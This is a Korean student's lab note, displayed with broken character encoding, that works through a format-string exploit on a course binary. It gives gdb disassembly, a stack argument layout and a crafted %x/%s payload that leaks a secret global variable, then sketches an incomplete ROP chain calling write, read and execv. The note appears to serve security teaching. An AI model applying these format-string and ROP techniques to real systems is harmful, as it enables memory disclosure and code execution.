ìš°ì„  `printf()`ê°€ ì‹¤í–‰ ë˜ê¸° ì§ì „ì˜ main stackì„ íŒŒì•…í•˜ê¸° ìœ„í•´ ì–´ì…ˆë¸”ë¦¬ë¥¼ ì‚´í´ë³´ë©´,
ë‹¤ìŒê³¼ ê°™ì´ return addressëŠ” `%rsp+0x40`ì—, `printf(`ì— ì „ë‹¬í•  `buf[]`ëŠ” `%rsp+0x10`ì— ìˆëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.
```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000401176 <+0>:     push   %rbx
   0x0000000000401177 <+1>:     sub    $0x40,%rsp
   ...
   0x00000000004011f9 <+131>:   lea    0x10(%rsp),%rdi
   0x00000000004011fe <+136>:   mov    $0x0,%eax
   0x0000000000401203 <+141>:   call   0x401050 <printf@plt>
```

ë”°ë¼ì„œ printf()ê°€ ì‹¤í–‰ë¼ì„œ `main()` stackì— ìƒˆë¡œìš´ `printf()` Stackì´ ì¶”ê°€ë˜ë©´
ë‹¤ìŒê³¼ ê°™ì€ Argment Layoutì„ ì˜ˆìƒí•  ìˆ˜ ìˆë‹¤. `(Stack ìƒì ë°‘, Stack ì† ë‚´ìš©ì€ ì¼ë‹¨ ë¬´ì‹œ)`
ì°¸ê³ ë¡œ ê° argëŠ” 8byteì´ë‹¤.
![](../../../../Z.%20Docs/img/Pasted%20image%2020241115131123.png)

ìš°ë¦¬ëŠ” 6ë²ˆì§¸ `%x` ë¶€í„° arg7ì— ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤.
ë”°ë¼ì„œ ì´ 2byte ê¸¸ì´ì¸ `%x`ì˜ ê°œìˆ˜ë¥¼ ì˜ ì¡°ì ˆí•˜ë©° bufì— `%x`ì™€ secretì˜ ë‚´ìš©ì„ char í˜•ì‹ìœ¼ë¡œ ì¶œë ¥ í•  `%s`, ê·¸ë¦¬ê³  secret.txtê°€ ì €ì¥ë˜ì–´ìˆëŠ” ì „ì—­ ë³€ìˆ˜ `secret`ì˜ ì£¼ì†Œ `0x404070`ë¥¼ ì „ë‹¬í•˜ì—¬ secret.txtë¥¼ ì¶œë ¥í•˜ë©´ ëœë‹¤.

ê²°ê³¼ì ìœ¼ë¡œ bufì— ë‹¤ìŒê³¼ ê°™ì´ Format Stringì„ ì „ë‹¬í•œë‹¤.
![](../../../../Z.%20Docs/img/Pasted%20image%2020241115131123.png)
- `%x%x%x%x%x` (5ê°œ): `printf()` í•¨ìˆ˜ ë‚´ì˜ argë¥¼ ê°€ë¦¬í‚¨ë‹¤. ë”°ë¼ì„œ ìì„¸íˆ ê³ ë ¤í•  í•„ìš”ëŠ” ì—†ë‹¤.
- 6ë²ˆì§¸ `%x`: arg7, ì¦‰ Nì„ ê°€ë¦¬í‚¨ë‹¤.
- 7ë²ˆì§¸ `%x`: arg8, ì¦‰ N+0x8ì„ ê°€ë¦¬í‚¨ë‹¤.
- 8ë²ˆì§¸ `%x`: arg9, ì¦‰ N+0x10ì„ ê°€ë¦¬í‚¨ë‹¤.
- 9ë²ˆì§¸ `%x`: arg10, ì¦‰ N+0x18ì„ ê°€ë¦¬í‚¨ë‹¤.
- 10ë²ˆì§¸ `%x`: arg11, ì¦‰ N+0x20ì„ ê°€ë¦¬í‚¨ë‹¤.
ì´ì œ ë‹¤ìŒ arg12ë¥¼ ê°€ë¦¬í‚¤ê¸° ì „ê¹Œì§€ ì´ 4byteì˜ ì…ë ¥ ê³µê°„ì´ ë‚¨ì•˜ë‹¤.
- ` \n` (2byte): ì¤„ë°”ê¿ˆì„ ì…ë ¥í•˜ì—¬ `recvline()`ìœ¼ë¡œ secret.txtë¥¼ ì½ì„ ìˆ˜ ìˆë„ë¡ í•œë‹¤.
- `%s`: arg12, ì¦‰ N+0x28ì„ ê°€ë¦¬í‚¨ë‹¤. Stringìœ¼ë¡œ ì¶œë ¥í•˜ê¸° ìœ„í•´ %së¥¼ ì§€ì •í•´ì£¼ì—ˆë‹¤.
ë§ˆì§€ë§‰ìœ¼ë¡œ N+0x28ì— ë‹¤ìŒ gdbë¡œ í™•ì¸í•œ ì „ì—­ ë³€ìˆ˜ `secret`ì„ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œë¥¼ ì§‘ì–´ë„£ëŠ”ë‹¤.
```nasm
Breakpoint 2, 0x00000000004011fe in main ()
(gdb) x/s 0x404070
0x404070 <secret>:      "1b19361b\n"
```
- `0x404070`: arg12

ì´ì œ secret.txtê°€ ì¶œë ¥ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì„ ê²ƒì´ë‹¤.

## 3-4

## 3-5
`wirte@plt(1, &write_got, 0x0x80)
`read@plt(0, &msg[], 0x00)
`execv()`

ì²«ë²ˆì§¸ ROP Table
```
| AAAA | %rdi_gadget | 1 | %rsi_gadget | ... | write@plt | main() |
// mainì„ í˜¸ì¶œí•´ì„œ mainì˜ ì²˜ìŒìœ¼ë¡œ ëŒì•„ê°„ë‹¤.
```

ê²°ë¡ ì ìœ¼ë¡œ 3-2ì˜ í™•ì¥í˜•ì´ê¸´ í•œë°, ë³´ì¡°í•¨ìˆ˜ë„ ì—†ê³ .. ì½”ë“œ ê¸¸ì´ë„ ì§§ê³ ..

# ì‹¤ìŠµ ì‹œí—˜

CSPRO ì‚¬ìš©
